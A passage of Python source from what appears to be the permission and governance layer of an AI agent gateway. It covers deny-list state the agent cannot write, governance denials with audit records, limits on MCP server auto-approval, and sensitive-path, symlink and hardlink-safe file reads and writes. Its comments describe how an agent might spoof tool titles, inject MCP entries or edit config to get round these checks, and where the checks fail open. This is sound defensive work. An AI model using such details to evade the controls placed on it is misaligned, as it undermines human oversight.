        logger.debug("governance pin resolution failed", exc_info=True)
        return set()


def load_denied_commands_state() -> dict:
    """Read the keystone ``denied_commands.json`` opt-out state (fail-soft to {}).

    The opt-out state (``{disable_all, disabled_ids, user_added}``) lives in a
    keystone trust-root file the agent cannot write, NOT in ``config.json``.
    Returns ``{}`` (= no opt-out, all built-ins enforced) if the file is absent,
    unreadable, or not a JSON object — fail-safe for a deny gate.
    """
    try:
        from kiro_crew.config.loader import denied_commands_path

        raw = json.loads(denied_commands_path().read_text(encoding="utf-8"))
        return raw if isinstance(raw, dict) else {}
    except FileNotFoundError:
        return {}
    except Exception:
        logger.debug("denied_commands.json load failed; treating as no opt-out", exc_info=True)
        return {}


def hooks_config_from_config_dict(hooks_section: dict) -> HooksConfig:
    """Build a ``HooksConfig`` for the gateway boot path.

    Parses the config.json ``hooks`` section for the flat hook keys, then
    OVERLAYS the denied-command opt-out state from the keystone
    ``denied_commands.json`` file (config.json's ``hooks.denied_commands`` is
    ignored — the keystone file is the sole source, so an agent that edits
    config.json cannot affect the deny ceiling).
    """
    merged = dict(hooks_section) if isinstance(hooks_section, dict) else {}
    merged["denied_commands"] = load_denied_commands_state()
    return HooksConfig.from_dict(merged)


def resolve_effective_denied_regexes(config: "HooksConfig", ctx: object = None) -> list[str]:
    """Effective regex-tier denied set from a HooksConfig (module-level).

    Same resolution as ``HookManager._effective_denied`` but usable by callers
    that hold a config rather than a HookManager (e.g. cron command vetting in
    ``mcp_cron``). Honors the user opt-out (disable_all / disabled_ids /
    user_added) with governance pins force-re-added (tightest-wins).
    """
    return security.compute_effective_denied(
        security.BUILTIN_DENIED_RULES,
        config.denied_commands_disabled_ids,
        config.denied_commands_disable_all,
        [p.pattern for p in config.denied_commands_user_added if p.enabled],
        _governance_pinned_command_ids(ctx),
    )


def effective_denied_regexes_from_config() -> list[str]:
    """Resolve the effective denied set from on-disk state.

    Convenience for surfaces with neither a HookManager nor a parsed config in
    hand (cron vetting). The denied-command opt-out state comes from the keystone
    ``denied_commands.json`` (NOT config.json). Fail-soft: on any load error,
    falls back to the full built-in set (fail-closed — safer for a deny gate) so
    a glitch can never silently drop enforcement.
    """
    try:
        cfg = HooksConfig.from_dict({"denied_commands": load_denied_commands_state()})
        return resolve_effective_denied_regexes(cfg)
    except Exception:
        logger.debug("effective denied-set load failed; failing closed", exc_info=True)
        return security.compute_effective_denied(security.BUILTIN_DENIED_RULES, (), False, (), ())


def _governance_denial(
    ctx: object,
    tool_name: str,
    session_key: str,
    agent: str,
    app: str,
    tool_kind: str = "",
    raw_params: dict | None = None,
) -> str | None:
    """Return a denial reason if governance forbids *tool_name*, else None.

    Resolves the active profile (Level 2) for the calling surface and intersects
    it with the boot-frozen ceiling (Level 1).  Fast no-op when the host has
    neither a policy ceiling nor any profiles, so an ungoverned standalone host
    pays only an attribute read.  Emits a governance audit record on a deny.

    Fail-closed discipline mirrors the CPP shims: a ``PlatformCompositionError``
    (a non-standalone host that could not compose) is re-raised, never swallowed;
    any other unexpected error degrades to "no governance opinion" (None) so a
    transient profile-load glitch cannot wedge every tool call — the always-on
    deny floor above already ran.
    """
    from kiro_crew.platform.context import PlatformCompositionError

    ceiling = getattr(ctx, "governance", None)
    try:
        from kiro_crew.platform.governance import gate_decision
        from kiro_crew.platform.governance_profiles import resolve_active_scope

        profile = resolve_active_scope(session_key, agent=agent, app=app)
        # Nothing to enforce: no ceiling and no bound/forced profile.
        if ceiling is None and profile is None:
            return None
        decision = gate_decision(
            ceiling, profile, tool_name, tool_kind=tool_kind, raw_params=raw_params
        )
        if not decision.permitted:
            _audit_governance(session_key, agent, tool_name, decision)
            return f"Blocked by governance policy: {decision.reason}"
        return None
    except PlatformCompositionError:
        raise
    except Exception:
        # Wrap the late import + audit so a broken/renamed/partially-installed
        # governance_profiles cannot raise ImportError out of this except-branch
        # and convert the intended soft fail-open into a hard fail-closed that
        # wedges every tool call.
        try:
            from kiro_crew.platform.governance_profiles import audit_governance_degraded

            audit_governance_degraded("hooks.on_tool_call", session_key=session_key, app=app)
        except Exception:
            logger.debug("governance degrade audit unavailable", exc_info=True)
        return None


def _app_owns_mcp_server(mcp_server_name: str, app: str) -> bool:
    """True when *mcp_server_name* is *app*'s OWN app-scoped MCP server.

    App-declared MCP servers are registered under the ``<app>:<server>`` key
    (``apps/bridges.py`` ``_own_mcp_servers``), so the owning app is the segment
    before the first ``:``.  ``mcp_server_name`` is the trusted, NON-model-authored
    identity from ``_meta.kiro.mcpServerName`` (``AcpEvent.mcp_server_name``) —
    NOT the LLM-authored display title — so a forged shell/host title cannot spoof
    a match: kiro-cli leaves ``mcp_server_name`` empty for non-MCP tools, and an
    empty value fails closed here.  Comparison is case-insensitive to mirror the
    governance MCP matcher.  Returns ``False`` for a blank ``app`` (an ordinary
    user/host turn carries no app identity) and for any server name that is not
    ``<app>:``-prefixed (host/managed servers such as ``kirocrew-cron`` never
    match).
    """
    if not app or not mcp_server_name:
        return False
    owning_app, sep, _rest = mcp_server_name.partition(":")
    return bool(sep) and owning_app.casefold() == app.casefold()


# Canonical ``<app>:<server>`` names DECLARED in shipped builtin manifests,
# populated ONCE at gateway boot via ``set_builtin_app_mcp_servers`` (see the
# dashboard startup). Parallel to ``_BUILTIN_APP_NAMES`` and kept as a plain
# module global for the same reason — the PreToolUse gate does ZERO filesystem
# I/O; the shipped-manifest scan happens once at boot, off the event loop. Names
# are casefolded on ingest so the gate lookup is a pure set membership test.
# Empty until warmed → fail-closed: an unrecognised server name never
# auto-approves. This is what stops an undeclared ``<app>:evil`` entry that
# landed in the MUTABLE global MCP config from being trusted just because its
# prefix matches a first-party app.
_BUILTIN_APP_MCP_SERVERS: frozenset[str] = frozenset()


def set_builtin_app_mcp_servers(names: Iterable[str]) -> None:
    """Install the set of shipped-manifest-declared ``<app>:<server>`` names.

    Called once at gateway boot with the names from
    ``apps.execution.builtin_app_mcp_servers`` (which enumerates the same
    immutable manifest sources as ``builtin_app_names``). Dependency-inverted
    like ``set_builtin_app_names`` so ``hooks`` never imports ``apps`` and the
    gate never touches the filesystem. Idempotent; a later call replaces the set.
    """
    global _BUILTIN_APP_MCP_SERVERS
    _BUILTIN_APP_MCP_SERVERS = frozenset(
        n.casefold() for n in names if isinstance(n, str) and n
    )


def _is_declared_builtin_mcp_server(mcp_server_name: str) -> bool:
    """True when *mcp_server_name* is a server a shipped builtin manifest declares.

    Pure in-memory, case-insensitive membership test against
    ``_BUILTIN_APP_MCP_SERVERS`` (warmed at boot from immutable manifests). The
    app-own-server auto-approve requires this in addition to prefix ownership so
    a ``<app>:``-prefixed entry the app never declared (e.g. one injected into
    the mutable global MCP config) cannot win an auto-approval. Fail-closed
    before the set is warmed.
    """
    return bool(mcp_server_name) and mcp_server_name.casefold() in _BUILTIN_APP_MCP_SERVERS


# Builtin (first-party) app names, populated ONCE at gateway boot via
# ``set_builtin_app_names`` (see the dashboard startup). Kept as a plain
# module global — NOT derived on the per-tool-call path — so the PreToolUse gate
# does ZERO filesystem I/O: scanning the shipped-manifest tree on the event loop
# (even once, before an lru_cache warmed) would stall every gateway task. Names
# are casefolded on ingest so the gate lookup is a pure set membership test.
# Empty until warmed → fail-closed: an app whose provenance is not yet known is
# treated as third-party and its own-server calls simply prompt (never wrongly
# auto-approved). Boot runs on the startup thread, well before any tool call.
_BUILTIN_APP_NAMES: frozenset[str] = frozenset()


def set_builtin_app_names(names: Iterable[str]) -> None:
    """Install the set of first-party (builtin) app names for the gate.

    Called once at gateway boot with the names discovered from the shipped
    manifests (``apps.execution.builtin_app_names``, which enumerates the same
    sources as ``shipped_builtin_app_root`` — core + the active edition). The
    dependency is
    inverted on purpose — boot code (which already imports ``apps``) pushes the
    names in, so ``hooks`` never imports ``apps`` and the gate never touches the
    filesystem. Idempotent; a later call replaces the set.
    """
    global _BUILTIN_APP_NAMES
    _BUILTIN_APP_NAMES = frozenset(n.casefold() for n in names if isinstance(n, str) and n)


def _is_first_party_app(app: str) -> bool:
    """True when *app* is a shipped builtin (first-party gateway code).

    Only a BUILTIN app's MCP server is provably the gateway's own shipped code,
    so only then does the app-own-server auto-approve's justification — "the
    server is the app's own declared code and only touches the app's own data,
    never a host surface" — actually hold.  A THIRD-PARTY installed app's server
    is arbitrary operator-installed code whose internals the PreToolUse gate
    cannot see (it reads files with plain OS syscalls in its own process, which
    the gate never observes), so its own-server calls are NOT blanket
    auto-approved here — they still surface for interactive approval / governance.
    What bounds a server's internal behavior is the OS sandbox it runs under plus
    the third-party install/admission gate, not this UX auto-approve.

    Pure in-memory lookup against ``_BUILTIN_APP_NAMES`` (populated at boot from
    immutable shipped-manifest provenance) — NO filesystem I/O on the event loop.
    Fail-closed before the set is warmed.
    """
    return bool(app) and app.casefold() in _BUILTIN_APP_NAMES


# Agent name → owning builtin app, populated ONCE at gateway boot via
# ``set_builtin_app_agents``. Parallel to ``_BUILTIN_APP_NAMES`` /
# ``_BUILTIN_APP_MCP_SERVERS`` and kept as a plain module global for the same
# reason — the PreToolUse gate does ZERO filesystem I/O. Keys are casefolded on
# ingest so the lookup is a pure dict hit. Empty until warmed → fail-closed: an
# unrecognised agent yields no app identity and its own-server calls simply
# prompt, exactly as before this map existed.
_BUILTIN_APP_AGENTS: dict[str, str] = {}


def set_builtin_app_agents(mapping: "Mapping[str, str]") -> None:
    """Install the agent → owning-builtin-app map for the gate.

    Called once at gateway boot with ``apps.execution.builtin_app_agents()`` —
    derived only from shipped manifests whose install is builtin-owned, with
    ambiguous names already dropped. Dependency-inverted like
    ``set_builtin_app_names`` so ``hooks`` never imports ``apps``. Idempotent; a
    later call replaces the map.
    """
    global _BUILTIN_APP_AGENTS
    _BUILTIN_APP_AGENTS = {
        agent.casefold(): app
        for agent, app in mapping.items()
        if isinstance(agent, str) and agent and isinstance(app, str) and app
    }


def _builtin_app_for_agent(resolved_agent: str) -> str:
    """The builtin app that SHIPS *resolved_agent*, or ``""`` when none provably does.

    Recovers an app identity for a slot whose ``_app`` is empty. ``Slot._app``
    comes from the request's AUTHENTICATED app scope, so a builtin app whose UI
    is not an app iframe — e.g. an Electron window that authenticates with the
    dashboard session cookie — binds its slot with NO app identity, and its
    calls to its OWN MCP server never satisfy the app-own-server auto-approve
    below (``_app_owns_mcp_server`` returns False for a blank app).

    The argument MUST be the RESOLVED agent (what actually served the turn, i.e.
    ``AcpClient._agent`` / ``read_effective_agent``), never ``Slot.agent``. The
    slot's agent is an ALIAS that ``resolve_agent_bindings`` maps to a concrete
    kiro agent before dispatch — a slot set to ``default`` can be served by
    ``kirocrew`` — so an alias NAMED after a builtin's agent would otherwise lend
    that app's identity to a different runtime agent entirely. Keying on the
    resolved id makes the grant follow what ran, matching the precedence
    ``read_effective_agent`` already establishes for usage attribution. The map
    itself is built solely from IMMUTABLE shipped manifests, so nothing the
    client sent decides which app an agent belongs to.

    Used ONLY to satisfy the app-own-server auto-approve. Deliberately NOT
    written back to ``Slot._app``: that field also drives app ISOLATION (which
    app may delete or retitle a slot), so marking a dashboard-created slot
    app-owned would widen those checks. Pure in-memory lookup; fail-closed before
    the map is warmed and for an empty resolved agent.
    """
    return _BUILTIN_APP_AGENTS.get(resolved_agent.casefold(), "") if resolved_agent else ""


def _cu_read_only_auto_approve(tool_name: str) -> bool:
    """True when *tool_name* is a computer-use OBSERVATION tool and the feature is on.

    Two independent conditions, both required:

    * the action is classified ``observe`` by the code-owned table in
      ``platform/governance.py`` (never by a title heuristic, and never by a
      private copy of the table — the class table is the single source of truth);
    * the keystone primary enable says the feature is on, so a disabled feature's
      tools are not silently pre-approved.

    Fail-CLOSED (False on any error): failing to auto-approve merely falls through
    to interactive approval, which is the safe direction.
    """
    action = computer_use_action_from_title(tool_name)
    if not action:
        return False
    if CU_CLASS_OBSERVE not in computer_use_action_classes(action):
        return False
    try:
        # Deferred deliberately: ``enable_state`` imports ``config.loader``, which
        # hooks.py keeps OFF its module import path (the loader fires the data-home
        # migration and pulls the whole config stack). Reached only after the
        # cheap prefix + class tests above, so an ungoverned host with no
        # computer-use traffic never pays for it.
        from kiro_crew.computer_use import enable_state

        return enable_state.is_enabled()
    except Exception:
        logger.debug("computer-use enable-state probe failed", exc_info=True)
        return False


def _audit_governance(session_key: str, agent: str, tool_name: str, decision: object) -> None:
    """Best-effort SEL audit of a governance denial (records scope/rule/layer)."""
    try:
        from kiro_crew.sel import sel

        sel().log_governance_decision(
            session_key=session_key,
            agent=agent or "kirocrew",
            tool_name=tool_name,
            outcome="denied",
            rule=getattr(decision, "rule", ""),
            layer=getattr(decision, "layer", ""),
            reason=getattr(decision, "reason", ""),
        )
    except Exception:
        logger.debug("governance audit emit failed", exc_info=True)


# Display prefixes that kiro-cli ACP adds to tool titles
_TOOL_TITLE_PREFIXES = ("Running: ", "Reading ")

# ACP semantic tool kind for a file write/edit (fs_write / code). The kind that
# carries a real target path in ``raw_params['path']`` and maps to the
# ``filesystem.write`` scope. Used to gate the write-only config-file protection
# so reads are not affected.
_EDIT_TOOL_KIND = "edit"


def _normalize_tool_name(tool_name: str) -> str:
    """Strip display prefixes so hook patterns match the actual tool/command name."""
    for prefix in _TOOL_TITLE_PREFIXES:
        if tool_name.startswith(prefix):
            return tool_name[len(prefix) :]
    return tool_name


def _tool_matches(pattern: str, tool_name: str) -> bool:
    """Match a tool pattern against a tool name.

    Supports: exact, ``prefix*``, ``*suffix``, ``*contains*``, ``*`` (all).
    Case-insensitive.
    """
    if pattern == "*":
        return True
    return fnmatch.fnmatch(tool_name.lower(), pattern.lower())


def validate_file_path(raw: str) -> str | None:
    """Validate and canonicalize a file path for dashboard file I/O.

    Enforces: is_sensitive_path(), realpath canonicalization.
    Returns the canonical path or None if rejected.
    """
    import os

    if not raw:
        return None
    path = os.path.realpath(os.path.expanduser(raw))
    if is_sensitive_path(path):
        return None
    return path


def safe_read_file(path: str) -> str:
    """Read a file after enforcing ``is_sensitive_path``.

    Canonicalizes the path (following every symlink), re-checks the RESOLVED
    target against ``is_sensitive_path`` — so a symlink pointing into ``~/.aws``
    etc. is refused through the link — then opens the canonical path with
    ``O_NOFOLLOW`` as defense-in-depth against a TOCTOU swap of the final
    component into a symlink after the check.  Opening the
    already-resolved canonical path never rejects a legitimate file (its final
    component is not a symlink by construction), so this only closes the race.

    Raises ``PermissionError`` if the path is sensitive or a symlink race is
    detected. Other read errors (missing file, permission denied) propagate
    unchanged so callers surface accurate messages.
    """
    import errno
    import os

    resolved = os.path.realpath(os.path.expanduser(path))
    if is_sensitive_path(resolved):
        raise PermissionError(f"Blocked: access to sensitive path: {resolved}")
    try:
        fd = os.open(resolved, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
    except OSError as exc:
        # ELOOP on the canonical (symlink-free) path means a concurrent TOCTOU
        # swap of the final component into a symlink — refuse it. Any other
        # OSError (ENOENT, EACCES) is a normal read error; re-raise as-is.
        if exc.errno in (errno.ELOOP, getattr(errno, "EMLINK", -1)):
            raise PermissionError(f"Blocked: refusing to follow symlink at {resolved}") from exc
        raise
    with os.fdopen(fd, "r", encoding="utf-8") as fh:
        return fh.read()


MAX_FILE_BYTES = 50 * 1024 * 1024  # 50 MB safety cap


class FileTooLargeError(Exception):
    """Raised when a file exceeds MAX_FILE_BYTES."""


def safe_read_file_bytes(raw: str) -> bytes | None:
    """Read file bytes through centralized is_sensitive_path() enforcement.

    ``validate_file_path`` already canonicalizes via ``realpath`` (following
    symlinks) and rejects sensitive resolved targets, so a workspace symlink
    into ``~/.aws`` etc. is refused before any read.  The final open uses
    ``O_NOFOLLOW`` on the canonical path as defense-in-depth against a TOCTOU
    swap of the final component into a symlink after the check.

    Returns file content as bytes, or None if path is rejected or unreadable.
    """
    import os

    path = validate_file_path(raw)
    if path is None:
        return None

    try:
        fd = os.open(path, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
    except OSError:
        return None
    try:
        with os.fdopen(fd, "rb") as fh:
            data = fh.read(MAX_FILE_BYTES + 1)
        if len(data) > MAX_FILE_BYTES:
            raise FileTooLargeError(f"File exceeds {MAX_FILE_BYTES // (1024 * 1024)} MB safety cap")
        return data
    except OSError:
        return None


def safe_read_file_bytes_with_identity(
    raw: str, allowed_identities: set[tuple[int, int]]
) -> bytes | None:
    """Read file bytes, authorizing the OPENED descriptor by inode identity.

    Like :func:`safe_read_file_bytes`, but closes the authorize-then-read TOCTOU
    window for callers that keep a filesystem allowlist. The file is opened ONCE
    with ``O_NOFOLLOW`` and the ``fstat`` identity ``(st_dev, st_ino)`` of that
    very descriptor MUST be in ``allowed_identities`` before any bytes are
    returned. Because authorization and read share one descriptor, a symlink- or
    directory-swap slipped in between ``realpath`` and ``open`` cannot substitute
    an unauthorized file — its inode is not in the allowlist. ``validate_file_path``
    still rejects sensitive resolved targets (``~/.aws`` …) up front, so
    all filesystem reads stay funnelled through this centralized chokepoint.

    Returns bytes on success. Raises :class:`PermissionError` when the opened
    inode is not allowlisted or a final-component symlink swap is detected
    (``O_NOFOLLOW`` → ``ELOOP``), and :class:`FileTooLargeError` when the file
    exceeds ``MAX_FILE_BYTES``. Returns ``None`` when the path is rejected by
    :func:`validate_file_path` or is otherwise unreadable.
    """
    import errno
    import os

    path = validate_file_path(raw)
    if path is None:
        return None

    try:
        fd = os.open(path, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
    except OSError as exc:
        if exc.errno in (errno.ELOOP, getattr(errno, "EMLINK", -1)):
            raise PermissionError(f"Blocked: refusing to follow symlink at {path}") from exc
        return None
    try:
        st = os.fstat(fd)
        if (st.st_dev, st.st_ino) not in allowed_identities:
            raise PermissionError("Blocked: file is not in the authorized set")
        with os.fdopen(fd, "rb", closefd=False) as fh:
            data = fh.read(MAX_FILE_BYTES + 1)
        if len(data) > MAX_FILE_BYTES:
            raise FileTooLargeError(f"File exceeds {MAX_FILE_BYTES // (1024 * 1024)} MB safety cap")
        return data
    finally:
        os.close(fd)


def stat_identity(raw: str) -> tuple[int, int] | None:
    """Return ``(st_dev, st_ino)`` of a file through the sensitive-path gate.

    Metadata-only companion to :func:`safe_read_file_bytes_with_identity` for
    callers that must build an inode allowlist from LLM-influenced paths without
    reading content. ``validate_file_path`` canonicalizes via ``realpath`` and
    rejects sensitive resolved targets, so a path that resolves into ``~/.aws``
    etc. is refused (returns ``None``) rather than ``stat``'d — keeping all
    LLM-path filesystem access funnelled through this centralized chokepoint.

    Returns ``(dev, ino)`` or ``None`` if the path is rejected or unstattable.
    """
    import os

    path = validate_file_path(raw)
    if path is None:
        return None
    try:
        st = os.stat(path)
    except OSError:
        return None
    return (st.st_dev, st.st_ino)


def _fd_real_path(fd: int) -> str | None:
    """Real filesystem path of an OPEN descriptor."""
    import os

    if os.name == "nt":
        try:
            import ctypes
            import msvcrt

            win_dll = getattr(ctypes, "WinDLL", None)
            get_osfhandle = getattr(msvcrt, "get_osfhandle", None)
            if not callable(win_dll) or not callable(get_osfhandle):
                return None
            kernel32 = win_dll("kernel32", use_last_error=True)
            get_final_path = kernel32.GetFinalPathNameByHandleW
            get_final_path.argtypes = [
                ctypes.c_void_p,
                ctypes.c_wchar_p,
                ctypes.c_uint32,
                ctypes.c_uint32,
            ]
            get_final_path.restype = ctypes.c_uint32
            buffer = ctypes.create_unicode_buffer(32768)
            length = get_final_path(
                ctypes.c_void_p(get_osfhandle(fd)),
                buffer,
                len(buffer),
                0,
            )
            if length == 0 or length >= len(buffer):
                return None
            path = buffer.value
            if path.startswith("\\\\?\\UNC\\"):
                return "\\\\" + path[8:]
            if path.startswith("\\\\?\\"):
                return path[4:]
            return path
        except (AttributeError, ImportError, OSError, ValueError):
            return None

    try:
        return os.readlink(f"/proc/self/fd/{fd}")  # Linux
    except OSError:
        pass
    try:
        import fcntl

        if hasattr(fcntl, "F_GETPATH"):  # macOS
            buf = fcntl.fcntl(fd, fcntl.F_GETPATH, bytes(1024))
            return buf.split(b"\x00", 1)[0].decode()
    except (OSError, ValueError, ImportError):
        pass
    return None


def safe_read_file_bytes_nolink(
    raw: str,
    within_root: str | None = None,
    *,
    max_bytes: int | None = None,
    allow_truncate: bool = False,
) -> bytes | None:
    """Like :func:`safe_read_file_bytes` but also rejects hardlinked inodes.

    Staging must pin its hardlink check to the SAME inode it reads.
    A caller that lstat()s the path and then opens it by name leaves a race
    window where the file is swapped for a hardlink to a sensitive file
    (e.g. ``~/.aws/config``) between the check and the open. Here the open
    happens first (``O_NOFOLLOW``), then ``fstat()`` on the descriptor —
    the inode that is validated is exactly the inode that is read:
    ``st_nlink > 1`` or a non-regular file type is rejected.

    When ``within_root`` is given, the OPENED descriptor's real path
    (via ``/proc/self/fd`` on Linux, ``fcntl.F_GETPATH`` on macOS) must resolve
    inside that root and must not be sensitive. ``O_NOFOLLOW`` only guards the
    FINAL path component — a nested directory swapped for a symlink between
    the tree walk and the open would silently escape the approved tree. The
    fd-path check is pinned to the inode actually opened, so no check-to-use
    window remains. If the fd's real path cannot be determined, fail closed.

    Returns file content as bytes, or None if the path is rejected,
    hardlinked, non-regular, escaping ``within_root``, or unreadable.
    """
    import os
    import stat as _stat

    # Callers that pass an explicit limit own the higher-level bound (for
    # example, the importer's trusted 64 MiB SQLite snapshot cap). Keep the
    # default cap for general reads, but do not silently narrow a documented
    # caller-specific limit back to 50 MiB.
    read_limit = MAX_FILE_BYTES if max_bytes is None else max_bytes
    if read_limit < 0:
        raise ValueError("max_bytes must be non-negative")
    path = validate_file_path(raw)
    if path is None:
        return None

    try:
        fd = os.open(path, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
    except OSError:
        return None
    try:
        st = os.fstat(fd)
        if st.st_nlink > 1 or not _stat.S_ISREG(st.st_mode):
            return None
        if within_root is not None:
            fd_real = _fd_real_path(fd)
            if fd_real is None:
                return None  # cannot verify containment -> fail closed
            root_real = os.path.realpath(within_root)
            try:
                contained = os.path.commonpath([fd_real, root_real]) == root_real
            except ValueError:
                contained = False
            if not contained:
                return None  # opened inode escapes the approved tree
            if is_sensitive_path(fd_real):
                return None
        with os.fdopen(fd, "rb") as fh:
            data = fh.read(read_limit + 1)
        fd = -1  # consumed by fdopen
        if len(data) > read_limit:
            # ``allow_truncate`` is for callers whose contract is "show as much
            # as fits" rather than "refuse oversize" -- the artifact store
            # displays a truncated view of a large linked file. The memory bound
            # is unaffected: at most ``read_limit + 1`` bytes were ever read.
            if allow_truncate:
                return data[:read_limit]
            raise FileTooLargeError(f"File exceeds {read_limit // (1024 * 1024)} MB safety cap")
        return data
    except OSError:
        return None
    finally:
        if fd >= 0:
            try:
                os.close(fd)
            except OSError:
                pass


# errnos meaning "this filesystem has no extended attributes", as opposed to "the
# lookup failed". Only the former is safe to treat as "nothing to carry".
_XATTR_UNSUPPORTED_ERRNOS = frozenset(
    e for e in (getattr(errno, n, None) for n in ("ENOTSUP", "EOPNOTSUPP", "ENOSYS"))
    if e is not None
)

_ACCESS_CONTROL_XATTR_PREFIXES = (
    "system.posix_acl_",  # POSIX ACLs: the actual permission set
    "security.",          # SELinux/SMACK/capabilities labels
)


def _is_access_control_xattr(attr: str) -> bool:
    """True when losing *attr* would leave the file less protected.

    Only these justify refusing a write. `user.*` is application metadata: worth
    carrying, not worth failing a save over on a filesystem that cannot store it.
    """
    return attr.startswith(_ACCESS_CONTROL_XATTR_PREFIXES)


def safe_write_file_nolink(
    raw: str,
    content: str,
    within_root: str | None = None,
) -> bool:
    """Overwrite an EXISTING regular file, pinned to the descriptor opened.

    The write twin of :func:`safe_read_file_bytes_nolink`, and it exists for the
    same reason: validating a path by name and then opening it by name leaves a
    check-to-use window in which the final component -- or an ancestor
    directory -- can be swapped for a symlink, so the write lands on a file the
    caller never authorized. Here the open happens FIRST (``O_NOFOLLOW``), then
    every check runs against that descriptor: ``fstat`` rejects hardlinks and
    non-regular files, and when ``within_root`` is given the OPENED inode's real
    path must resolve inside it and must not be sensitive. Failing to determine
    the fd's real path fails closed.

    The target is opened WITHOUT ``O_CREAT``: a caller mirroring content back to
    a file it previously read has no business creating one, and refusing turns
    "the file moved" into a no-op rather than a surprise new file. The bytes then
    land via an atomic replace (staged sibling + directory-fd-relative rename),
    so a write that fails partway leaves the original untouched instead of a
    truncated file.

    Returns True when the bytes were written, False on any rejection.
    """
    path = validate_file_path(raw)
    if path is None:
        return False
    encoded = content.encode("utf-8")
    try:
        # O_RDWR, not O_WRONLY: the no-dir-fd path below needs to READ the
        # original bytes before truncating so it can put them back if the write
        # fails. Same inode checks either way.
        fd = os.open(path, os.O_RDWR | getattr(os, "O_NOFOLLOW", 0))
    except OSError:
        return False
    # The descriptor must survive validation (the no-dir-fd path below writes
    # THROUGH it), so it cannot be closed in a blanket `finally`. Validation
    # therefore runs in a nested function: every rejection is a single return
    # here, and the one caller closes the fd on any of them. Returning False
    # directly from inside the checks is what leaked descriptors -- one per
    # rejected update, until the gateway ran out.

    def _validate() -> tuple[int, tuple[int, int]] | None:
        st = os.fstat(fd)
        if st.st_nlink > 1 or not _stat.S_ISREG(st.st_mode):
            return None
        # Carried to the staged file below: a replace that dropped the original's
        # permissions would silently turn a 0644 shared doc or an 0755 script
        # into 0600 and break every other reader (or the execute bit).
        mode = _stat.S_IMODE(st.st_mode)
        if within_root is not None:
            fd_real = _fd_real_path(fd)
            if fd_real is None:
                return None  # cannot verify containment -> fail closed
            root_real = os.path.realpath(within_root)
            try:
                contained = os.path.commonpath([fd_real, root_real]) == root_real
            except ValueError:
                contained = False
            if not contained:
                return None  # opened inode escapes the approved tree
            if is_sensitive_path(fd_real):
                return None

        # (st_dev, st_ino): the staged rename re-resolves `base` against a
        # directory fd, and only this pair proves it lands on the checked file.
        # st_uid vs geteuid: a rename installs a NEW inode owned by THIS
        # process's user, so replacing a file owned by someone else (a
        # group-writable file in a shared project) would silently transfer
        # ownership away from its owner, and only root could chown it back. The
        # caller uses this to pick the write mechanism.
        # getattr, not os.geteuid() directly: it does not exist on Windows, and
        # AttributeError is NOT an OSError -- it would escape this function's
        # `except OSError`, escape the caller, and surface as a 500 with the
        # descriptor leaked and current.html already written. Same reason
        # O_DIRECTORY and fchmod are guarded below; this is the third
        # POSIX-only attribute in this one function.
        return mode, (st.st_dev, st.st_ino)

    try:
        validated = _validate()
    except OSError:
        validated = None
    if validated is None:
        try:
            os.close(fd)
        except OSError:
            pass
        return False
    src_mode, src_ident = validated

    # From here on the descriptor stays OPEN. It is the only handle proven to
    # point at the validated inode, and the no-dir-fd path below writes through
    # it rather than re-resolving the name.

    # ATOMIC REPLACE, never truncate-then-write. Truncating first means a write
    # that fails partway (ENOSPC, EIO, EDQUOT) leaves the user's file empty or
    # half-written with no way back. Stage the complete payload beside the target
    # and rename over it: the rename is atomic, so the file is either the old
    # bytes or all of the new ones.
    #
    # The staging + rename are DIRECTORY-FD RELATIVE. Doing them by name would
    # hand back the check-to-use window the O_NOFOLLOW open just closed -- the
    # parent could be swapped for a symlink between the checks above and the
    # rename. The directory fd is opened O_NOFOLLOW and re-verified, and both
    # halves of the rename resolve against it.
    parent, base = os.path.split(path)
    # A UNIQUE staging name, created with O_EXCL. A predictable sibling could
    # already exist as real user data, and O_CREAT|O_TRUNC would have destroyed
    # it and then renamed it away. O_EXCL also means we only ever clean up a file
    # this call created.
    tmp_name = f".{base}.kirocrew-{os.getpid()}-{uuid.uuid4().hex}.tmp"
    # Directory-fd pinning is an ENHANCEMENT, not a precondition. Where the POSIX
    # APIs exist (Linux) the staging and rename resolve against an open handle on
    # the parent, so an ancestor swapped mid-save cannot redirect the write. Where
    # they do not (Windows), the same staged payload is renamed BY NAME instead --
    # which is exactly what every editor's atomic save does, and is what actually
    # protects the user's data: the file is either the old bytes or all of the new
    # ones, never a shredded half-write.
    #
    # This used to fail closed without the pinned variant. That made the whole
    # mirror-back feature Linux-only in order to defend against someone renaming
    # directories inside your project during the milliseconds of a save, on your
    # own machine, to a file you explicitly asked us to link. Losing the feature
    # on two platforms was the larger harm.
    #
    # Use getattr for O_DIRECTORY: a bare os.O_DIRECTORY raises AttributeError,
    # which `except OSError` would NOT catch, surfacing as a 500.
    # NOTE: the capability probe names os.rename, not os.replace. CPython lists
    # only os.rename in supports_dir_fd even though os.replace accepts the same
    # arguments -- probing os.replace silently disables pinning on Linux.
    o_directory = getattr(os, "O_DIRECTORY", 0)
    use_dir_fd = bool(
        o_directory
        and os.open in getattr(os, "supports_dir_fd", set())
        and os.rename in getattr(os, "supports_dir_fd", set())
    )

    # Extended attributes are read from the DESCRIPTOR, not the pathname, and read
    # HERE while it is still open. A by-name `listxattr(path)` re-resolves the
    # whole path, so an ancestor renamed mid-save makes the lookup fail while the
    # pinned rename below still succeeds -- installing a replacement stripped of
    # the owner's ACL. Everything else in this function is descriptor-pinned; this
    # was the one read that was not.
    #
    # A filesystem that does not support xattrs at all is NOT an error: there is
    # nothing on the source to lose. Any OTHER failure means we cannot know what
    # we would be dropping, so it refuses.
    src_xattrs: list[tuple[str, bytes]] = []
    if all(hasattr(os, a) for a in ("listxattr", "getxattr", "setxattr")):
        try:
            for _attr in os.listxattr(fd):
                src_xattrs.append((_attr, os.getxattr(fd, _attr)))
        except OSError as exc:
            if exc.errno not in _XATTR_UNSUPPORTED_ERRNOS:
                logger.warning(
                    "refusing source write to %r: could not read its extended attributes "
                    "(%s), so a replacement could silently drop access controls",
                    path,
                    exc,
                )
                try:
                    os.close(fd)
                except OSError:
                    pass
                return False
            src_xattrs = []

    # POSIX: the descriptor's job is done -- the staged rename below is pinned by
    # the directory fd instead, and holding a second handle buys nothing.
    try:
        os.close(fd)
    except OSError:
        pass

    dfd = -1
    created = False
    try:
        if use_dir_fd:
            try:
                dfd = os.open(parent, os.O_RDONLY | o_directory | getattr(os, "O_NOFOLLOW", 0))
            except OSError:
                return False
